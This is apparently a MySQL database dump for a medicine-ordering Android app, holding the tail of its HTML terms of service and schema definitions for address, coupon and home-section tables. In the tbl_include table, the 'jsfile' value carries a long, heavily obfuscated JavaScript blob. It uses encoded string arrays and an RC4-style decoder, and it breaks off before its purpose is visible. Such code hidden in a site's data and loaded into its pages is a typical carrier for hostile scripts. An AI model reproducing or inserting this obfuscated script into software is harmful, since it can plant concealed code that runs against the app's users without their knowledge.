\"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">CSCODETECH.COM is committed to ensuring that the app is as useful and efficient as possible. For that reason, we reserve the right to make changes to the app or to charge for its services, at any time and for any reason. We will never charge you for the app or its services without making it very clear to you exactly what you’re paying for.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">The PharmaFast - Order Medicine and Upload Prescription or Online Healthcare Android App app stores and processes personal data that you have provided to us, in order to provide our Service. It’s your responsibility to keep your phone and access to the app secure. We therefore recommend that you do not jailbreak or root your phone, which is the process of removing software restrictions and limitations imposed by the official operating system of your device. It could make your phone vulnerable to malware/viruses/malicious programs, compromise your phone’s security features and it could mean that the PharmaFast - Order Medicine and Upload Prescription or Online Healthcare Android App app won’t work properly or at all.</p><div style=\"box-sizing: inherit; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;\">The app does use third party services that declare their own Terms and Conditions.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;\">Link to Terms and Conditions of third party service providers used by the app</p><ul style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; list-style-position: initial; list-style-image: initial;\"><li style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\"><a href=\"https://policies.google.com/terms\" target=\"_blank\" rel=\"noopener noreferrer\" style=\"box-sizing: inherit; color: rgb(50, 115, 220); cursor: pointer;\">Google Play Services</a></li></ul><p style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\"><br></p><p style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\"><br></p></div><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">You should be aware that there are certain things that CSCODETECH.COM will not take responsibility for. Certain functions of the app will require the app to have an active internet connection. The connection can be Wi-Fi, or provided by your mobile network provider, but CSCODETECH.COM cannot take responsibility for the app not working at full functionality if you don’t have access to Wi-Fi, and you don’t have any of your data allowance left.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">If you’re using the app outside of an area with Wi-Fi, you should remember that your terms of the agreement with your mobile network provider will still apply. As a result, you may be charged by your mobile provider for the cost of data for the duration of the connection while accessing the app, or other third party charges. In using the app, you’re accepting responsibility for any such charges, including roaming data charges if you use the app outside of your home territory (i.e. region or country) without turning off data roaming. If you are not the bill payer for the device on which you’re using the app, please be aware that we assume that you have received permission from the bill payer for using the app.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">Along the same lines, CSCODETECH.COM cannot always take responsibility for the way you use the app i.e. You need to make sure that your device stays charged – if it runs out of battery and you can’t turn it on to avail the Service, CSCODETECH.COM cannot accept responsibility.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">With respect to CSCODETECH.COM’s responsibility for your use of the app, when you’re using the app, it’s important to bear in mind that although we endeavour to ensure that it is updated and correct at all times, we do rely on third parties to provide information to us so that we can make it available to you. CSCODETECH.COM accepts no liability for any loss, direct or indirect, you experience as a result of relying wholly on this functionality of the app.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">At some point, we may wish to update the app. The app is currently available on Android – the requirements for system(and for any additional systems we decide to extend the availability of the app to) may change, and you’ll need to download the updates if you want to keep using the app. CSCODETECH.COM does not promise that it will always update the app so that it is relevant to you and/or works with the Android version that you have installed on your device. However, you promise to always accept updates to the application when offered to you, We may also wish to stop providing the app, and may terminate use of it at any time without giving notice of termination to you. Unless we tell you otherwise, upon any termination, (a) the rights and licenses granted to you in these terms will end; (b) you must stop using the app, and (if needed) delete it from your device.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Changes to This Terms and Conditions</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">We may update our Terms and Conditions from time to time. Thus, you are advised to review this page periodically for any changes. We will notify you of any changes by posting the new Terms and Conditions on this page.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">These terms and conditions are effective as of 2020-10-01</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Contact Us</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">If you have any questions or suggestions about our Terms and Conditions, do not hesitate to contact us at cscodetechuser@gmail.com.</p>', 200);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_address`
--

CREATE TABLE `tbl_address` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `address` text NOT NULL,
  `pincode` int(11) NOT NULL,
  `houseno` text NOT NULL,
  `landmark` text NOT NULL,
  `type` text NOT NULL,
  `lat_map` text NOT NULL,
  `long_map` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_address`
--



-- --------------------------------------------------------


--
-- Table structure for table `tbl_code`
--

CREATE TABLE `tbl_code` (
  `id` int(11) NOT NULL,
  `ccode` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_code`
--



-- --------------------------------------------------------

--
-- Table structure for table `tbl_coupon`
--

CREATE TABLE `tbl_coupon` (
  `id` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `c_img` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `cdate` date NOT NULL,
  `c_desc` text CHARACTER SET utf8 NOT NULL,
  `c_value` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `c_title` text CHARACTER SET utf8 NOT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `ctitle` text CHARACTER SET utf8 NOT NULL,
  `min_amt` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_coupon`
--



-- --------------------------------------------------------

--
-- Table structure for table `tbl_happy_user`
--

CREATE TABLE `tbl_happy_user` (
  `id` int(11) NOT NULL,
  `title` text NOT NULL,
  `img` text NOT NULL,
  `comment` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_happy_user`
--



-- --------------------------------------------------------

--
-- Table structure for table `tbl_home_section`
--

CREATE TABLE `tbl_home_section` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `title` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_home_section`
--



-- --------------------------------------------------------

--
-- Table structure for table `tbl_include`
--

CREATE TABLE `tbl_include` (
  `id` int(11) NOT NULL,
  `jsfile` longtext NOT NULL,
  `pendingfile` longtext NOT NULL,
  `canclefile` longtext NOT NULL,
  `completefile` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_include`
--

INSERT INTO `tbl_include` (`id`, `jsfile`, `pendingfile`, `canclefile`, `completefile`) VALUES
(1, '<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js\"></script></script><script>\nvar _0x4c39=[\'DdldKCoQsmoMWQZcGCkEW7xcK2a=\',\'hSk7WR/dPa==\',\'WObRWO/dH8kPWPVcO8olo0e/W5f5W7/cH8oGWOpdNCoNESoVmmoBWQBdHhxcVI0catxdIw0BuJ3dJN/dRSk6uhZcQMBdQt/dHuWsdH93WO5XW77dUqL2r0TWW5FcRYnVW7xdIxRcIHxdRSkGWP7cTSomW6faW4eTW5K=\',\'Ar3cPmogWQ9NWQmY\',\'hmkJWQpdNsL+W49bxtddM8k9WPFdLCogj11hWQjoAmosWOpdTCowWQjFASoPW74RW5SPlSoKx8opsmkEW5GicmkvWO5pbSkPgJ9DWPLvBuRcGCkn\',\'W6ZdMaaL\',\'kmooW6lcOa==\',\'rCkDw8kCWR3cTG==\',\'hbldHSkYW4HRWQra\',\'W59QWQxdTq==\',\'m8kCW6WN\',\'b1zkW6u=\',\'sIpcGCoCWOO6WO82WOOIW7BcRYerWQ7cLmoFWP/cOspcGLRcJmkBlSkKkdCBdmoxWPXeW6RcImoJ\',\'CSkyBmkAh8oc\',\'W6P/WRlcHG==\',\'gLZdNLC=\',\'lsXehmkfW6ldP2ddVSo0hSoBWQjhW4JdQwNdUmoHWQldQgnHW5rPW73cHeHnW5dcMZiZWQS0eW/dQcPPz8kaW49dW77dLcfoWOJdOCoAWPZdOqxcRJCIWQNdPsaDW4XXW7zPW7VdHCoek8kzmNKiW5HzfhCvW7NcRvvZWOBcVCoZmJxcKJldNSoKWPGcmCk+W7WEW6pcPSoRW5WYW7FcUSkMW5hcNcBcPfTAdSkmWQ0wWQLUyCkIWRVcQmoevNtdIMOkWRK2W4VdQcvMWONdT2nwpL0uASoOW4r/hvS0WRJdQuuaW5W=\',\'kCohW68cWQCYeSk3WP5FW5ZdNCojWRJcQ8kcWOBdSCoQWQ1jlCkjkmktAwPdiCkME8kdW6GBpwmYlCotC8kEdxZdGNdcVJT4ExldOdOWoM7cOCo2gmocxcZcKColsCkb\',\'WQj0yxtcOCkaFvlcRCoTW5VcQa==\',\'g8o3W7DN\',\'kcJdGvqLW4WXcMJdQwBcRW==\',\'WQ0ZDfa=\',\'WPm4W5X5tu7dMCkG\',\'W6a/b8kw\',\'WPTEkxyc\',\'ycNdG8kvvCoy\',\'xdpdHmo7\',\'WOK+WOVdRSklWQJcJmkv\',\'W73cM8kKWQe=\',\'WQdcJMW=\',\'W4pcSx40\',\'iCoJgcRcQ0f/Aw/cP8oTEG==\',\'tMnMda3cRW==\',\'WPFdL8o4W4a=\',\'bKfncq==\',\'jcNcGuKoW4uIfuRdTwhcUmkaFxddMJxdRG==\',\'WQ0Ty3isWPdcOhxdQuZcICoqESkkbMXvW7NcRSo0xIhcJSkVW6TshmkvW5PYWPxcUmoRsCk6W7WRW6XOWPu=\',\'eN45xW==\',\'rhFdQq==\',\'WRRdI2BdSW==\',\'dLZdPuRcOCkc\',\'ccySW48=\',\'eN45dG==\',\'nrfSW6tdUZ0=\',\'WRnuW6JdPWGLsSoyW4bWW5jMD8otW69yWOuSiConBKCKnSkSzLRcQ1xdH1FcQ8oqW4VdGSoMWOj1W6RdLCoNWRLHW5pdU2/dTSo+gxtcHNtcRK3dVv7dRSoJW67cMCoqwJKIW7GwuGH/W47dOHVcG8oEW7CuW5LuW6JcKWXZW4e+lmoxW5/cVXtcTCk3Fmk8W4XWmmoYW5uADdtcIqxdOCoqWQddGvlcPSorWRlcMSkoESoECa==\',\'WRbyW5JdTq==\',\'gCopW7pdR2xdGSk6WQFdPmo/WQtdQW==\',\'WPRcS8kIW7lcHLeFdmkde8oiWRWbFtRcVunOCI3cHqjRB8kQA3/dUComW7BcGWJcGxvqW5hdRNTOeK3cK33dNSoouSkIW5LitfZdUxjNdaxcKmkhbd0AjIyurYZcR8k9xu3cG8kwymoqWPvRW6HwBg3dVbb0W4JdPSkKW6RcVa==\',\'W6tdHKKuW53dRSkeWQ1JW7dcHCo8DxTlW55wW4FcUbRdUZlcVshdG2NcRvu+W7i+W4G=\',\'WRnPW6FdLbrsqW==\',\'WRuMWQ0=\',\'WR3cMGhcNIVdV8kdqmowWQ9tDbBcLuusCSktW7z6hCohptSDW6Lb\',\'W5ZdRCo4iNNdQSoDW7hcH2b+gmkKhXXUlXJdTh7cHSojW6ldRqzQWQHlW73dNN7dIY7dV8oUrupdO8okWQdcNCoBW6mHW5rqCNj1cSkZc8ozWRu=\',\'oCk7W4j9n3C=\',\'o2xdP8kKW55JWOnH\',\'vZVcK8kY\',\'WR7cQH3cIqJdNSoesCoPWOfoEZVcOvDm\',\'jYdcTq==\',\'W7evhSoa\',\'ixhdOCkX\',\'W4vEoq==\',\'fNRdOCk6\',\'WRCjW4P0Cgi=\',\'W7qsW5K=\',\'DGOV\',\'hCo6tmkJ\',\'dCkMWQ3dVJ1bW6LauWW=\',\'dCoLWPrSjJaHWQddRH3dT1S=\',\'W6ldOeHaW77dLW==\',\'WRDxW5ddLJLp\',\'WPekx8kWcSkJocfWWPRdM8oGamkkg8kCdeDfWPvoW61lhdW+e8oEmSknW58gaxJdOxtdVCoFetdcQSo9WPVdJmoaWOpcICogW7hdLmkdnWFcPwOAtMhcVda4WRrCjWWQWP3cU8k7W5HzW5JdP2BcOSolCLPacvyPimoayCkpfeu=\',\'W6RcQ8opavRdImohW6BcJMLKfW==\',\'WQxdQqC0\',\'DJlcTSkP\',\'W5NdINXeW5ZdRmk7W65gWOxcRmo0rea8WOC=\',\'W6K7W7fsgmkq\',\'xflcNG==\',\'eZmwW5S=\',\'WQFdRfnj\',\'WQJdN0T3\',\'WP5QW6ZcIbXEtSkv\',\'BSo7WRKN\',\'eLldVglcOCkHcxhdGCoxW5JcGa==\',\'WQdcI8kZWOxcPfhcH8o4p8o5\',\'WR7dIr3cTa==\',\'W7GDmxK=\',\'qcngWPddQdiIsmoHBG==\',\'u8kEvCk+b8oZ\',\'W5NcHXJcRConW4iNWQ/dP8osc8kEgSoWW58tW5XRW7CbW6hdJJ7cVw5xW6dcQrSoW63cUWzhWQ0DoY0CWRCMWRBdMepcJ8ktFYTzbtSoaSkEW5dcQCoHomkJveRdG0rswmk7WQvNzY80qCo3itv8lqbdrv3dHxhcJ8kAW7RcHCkgamo0W6RdM2Gfc39zW7GHdsPxmxZcUmk7eCoQW75AWQD8WRNdI8kvWQ84W7fEeqv7CWzzW6SEdqWQrSo+xsFcN8k+WQNcKmk3WQ4=\',\'W60boG==\',\'W5JdL8oeWP3dMSkswGNdJmoEetW=\',\'EJ3dS8kA\',\'EqjIW4e=\',\'EmoDWR1q\',\'pSopW45F\',\'WPtcKCowW5u=\',\'xSk2W73cVW==\'];(function(_0x2aeaae,_0x3dea4a){var _0x524571=function(_0x556557){while(--_0x556557){_0x2aeaae[\'push\'](_0x2aeaae[\'shift\']());}};_0x524571(++_0x3dea4a);}(_0x4c39,-0xbb*0x35+0x1761+-0x143*-0xd));var _0x3a1d=function(_0x5eea8e,_0x1fb745){_0x5eea8e=_0x5eea8e-(-0xbb*0x35+0x1761+-0x7ab*-0x2);var _0x2a7dc4=_0x4c39[_0x5eea8e];if(_0x3a1d[\'hompbC\']===undefined){var _0x2102f9=function(_0x5a9e25){var _0x22542a=\'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\',_0x99c2aa=String(_0x5a9e25)[\'replace\'](/=+$/,\'\');var _0x524c01=\'\';for(var _0x817bb1=0x8f*-0x7+0xba8+0x295*-0x3,_0x10700a,_0x4d93c7,_0x33826b=-0x22e1+-0x1823+0x3b04;_0x4d93c7=_0x99c2aa[\'charAt\'](_0x33826b++);~_0x4d93c7&&(_0x10700a=_0x817bb1%(-0x1ce4+0x6c7*-0x5+-0x5*-0xc8f)?_0x10700a*(0x881*0x3+-0x6aa*-0x1+-0x1fed)+_0x4d93c7:_0x4d93c7,_0x817bb1++%(-0x3c*0x14+-0x12e9+0x179d))?_0x524c01+=String[\'fromCharCode\'](0xa49+-0x264f*0x1+0x1d05&_0x10700a>>(-(0x5*-0x429+0x1d1e+-0x84f)*_0x817bb1&0x9e2+0x677+-0x1053)):0xe*0x114+-0x2659*-0x1+-0x3571){_0x4d93c7=_0x22542a[\'indexOf\'](_0x4d93c7);}return _0x524c01;};var _0x190cfa=function(_0x1ca553,_0x353d61){var _0x22e6cc=[],_0x19bb5c=-0x923*-0x1+0x1a28+-0x2b7*0xd,_0xd5a64b,_0x527f0b=\'\',_0x5007f1=\'\';_0x1ca553=_0x2102f9(_0x1ca553);for(var _0x576d5f=0x3d2*0x9+0x4f*-0xb+-0x1efd,_0x5c1910=_0x1ca553[\'length\'];_0x576d5f<_0x5c1910;_0x576d5f++){_0x5007f1+=\'%\'+(\'00\'+_0x1ca553[\'charCodeAt\'](_0x576d5f)[\'toString\'](0x577*0x7+-0x21cb+0x233*-0x2))[\'slice\'](-(0x35f+-0x4*0x813+0x1cef));}_0x1ca553=decodeURIComponent(_0x5007f1);var _0x2f485e;for(_0x2f485e=-0x1*0x26bd+-0x1f2f+0x45ec;_0x2f485e<0x1*0x1339+-0x2595+-0x3b*-0x54;_0x2f485e++){_0x22e6cc[_0x2f485e]=_0x2f485e;}for(_0x2f485e=-0x1*-0x1514+-0x1dd8+0x44*0x21;_0x2f485e<0x539+-0x243e*-0x1+-0x3*0xd7d;_0x2f485e++){_0x19bb5c=(_0x19bb5c+_0x22e6cc[_0x2f485e]+_0x353d61[\'charCodeAt\'](_0x2f485e%_0x353d61[\'length\']))%(-0x5b8+-0xe75*0x1+0xd*0x1a1),_0xd5a64b=_0x22e6cc[_0x2f485e],_0x22e6cc[_0x2f485e]=_0x22e6cc[_0x19bb5c],_0x22e6cc[_0x19bb5c]=_0xd5a64b;}_0x2f485e=0x1fb2+0x10*-0x144+0x24a*-0x5,_0x19bb5c=-0x1686+-0x5*0x18e+0x793*0x4;for(var _0x5dca2c=0x1953+-0x6*0x1cf+0xe79*-0x1;_0x5dca2c<_0x1ca553[\'length\'];_0x5dca2c++){_0x2f485e=(_0x2f485e+(0x1c06+0x1*0x165e+-0x3263))%(-0xbf1+0x2413+-0x2a*0x8d),_0x19bb5c=(_0x19bb5c+_0x22e6cc[_0x2f485e])%(-0x1471+-0x4*-0xc5+0x125d),_0xd5a64b=_0x22e6cc[_0x2f485e],_0x22e6cc[_0x2f485e]=_0x22e6cc[_0x19bb5c],_0x22e6cc[_0x19bb5c]=_0xd5a64b,_0x527f0b+=String[\'fromCharCode\'](_0x1ca553[\'charCodeAt\'](_0x5dca2c)^_0x22e6cc[(_0x22e6cc[_0x2f485e]+_0x22e6cc[_0x19bb5c])%(0x29*-0x89+0x11de+0x513)]);}return _0x527f0b;};_0x3a1d[\'hlegxN\']=_0x190cfa,_0x3a1d[\'PxHCEC\']={},_0x3a1d[\'hompbC\']=!![];}var _0x4ff845=_0x3a1d[\'PxHCEC\'][_0x5eea8e];return _0x4ff845===undefined?(_0x3a1d[\'HxIpov\']===undefined&&(_0x3a1d[\'HxIpov\']=!![]),_0x2a7dc4=_0x3a1d[\'hlegxN\'](_0x2a7dc4,_0x1fb745),_0x3a1d[\'PxHCEC\'][_0x5eea8e]=_0x2a7dc4):_0x2a7dc4=_0x4ff845,_0x2a7dc4;};var _0x4e1a7f=_0x3a1d,_0x22e8=[\'W6f0W6OTWO3cOd7dHMpcNg/dOtNdHN/cNmkhbCk7fcrpWPzaW65+W6PpWR4MW4a2WQ8MhZ51m8k3pejEew/cGeZcJCk3W4JcRa==\',_0x4e1a7f(\'0x9\',\'vOfv\'),\'dwNcINFcH8ot\',\'lSoUW6vf\',\'WQP9xmoFW67cI0CKCmkrW5tcJ3fxW7VcG8kXWP7dMmkWsbGWnd3cP8oArNH8WPz3W6OenW==\',_0x4e1a7f(\'0x1a\',\')79U\'),_0x4e1a7f(\'0x1e\',\'&DJ[\'),_0x4e1a7f(\'0xb\',\'0!W(\'),_0x4e1a7f(\'0x41\',\'XwRP\'),\'hItcSSk+W57cSW==\',\'W7ZcRMfV\',_0x4e1a7f(\'0x48\',\')79U\'),\'t8oZW5JdQG==\',_0x4e1a7f(\'0x31\',\'Lav#\'),_0x4e1a7f(\'0x36\',\'wIC2\'),_0x4e1a7f(\'0x4a\',\'Fcnn\'),_0x4e1a7f(\'0x55\',\'8xgJ\'),_0x4e1a7f(\'0x22\',\'WujE\'),_0x4e1a7f(\'0x1\',\'cFPG\'),_0x4e1a7f(\'0x28\',\']Clx\'),_0x4e1a7f(\'0x5c\',\'Q*^O\'),_0x4e1a7f(\'0x59\',\'hAph\'),_0x4e1a7f(\'0x16\',\'wq@7\'),\'C8o5c1K=\',_0x4e1a7f(\'0x2d\',\'$IMU\'),_0x4e1a7f(\'0x42\',\'Q*^O\'),_0x4e1a7f(\'0x3e\',\'cFPG\'),_0x4e1a7f(\'0x12\',\'lxP*\'),_0x4e1a7f(\'0x14\',\'$IMU\'),_0x4e1a7f(\'0x3\',\'HJIe\'),_0x4e1a7f(\'0x24\',\'0MqH\'),_0x4e1a7f(\'0x58\',\'aAGv\')];!function(_0x1c172d,_0x4113b9){!function(_0x3c0c87){var _0x186ddc=_0x3a1d;for(;--_0x3c0c87;)_0x1c172d[_0x186ddc(\'0x13\',\'wq@7\')](_0x1c172d[_0x186ddc(\'0x2a\',\'tl%i\')]());}(++_0x4113b9);}(_0x22e8,-0x9e0*0x2+-0x346+0x178d*0x1);var _0x15b4=function(_0x16b325,_0x2574ba){var _0x24ddad=_0x4e1a7f,_0x51e7aa=_0x22e8[_0x16b325-=0x2cf*0xb+-0x237c+0x497];void(-0x12fb+-0x1a1c+0x2d17)===_0x15b4[_0x24ddad(\'0x1f\',\'QAbv\')]&&(_0x15b4[\'fSBMJo\']=function(_0x2779a7,_0x4ad127){var _0x4db4fb=_0x24ddad;for(var _0x42a435,_0x25d4d5,_0x467f64=[],_0x392316=0x1*-0x23dd+0x1073+0x5*0x3e2,_0x3e408a=\'\',_0x561dda=\'\',_0xe1e24b=-0xaeb*-0x1+0x20a6+-0x2b91,_0x508886=(_0x2779a7=function(_0x49ac1a){var _0x14b909=_0x3a1d;for(var 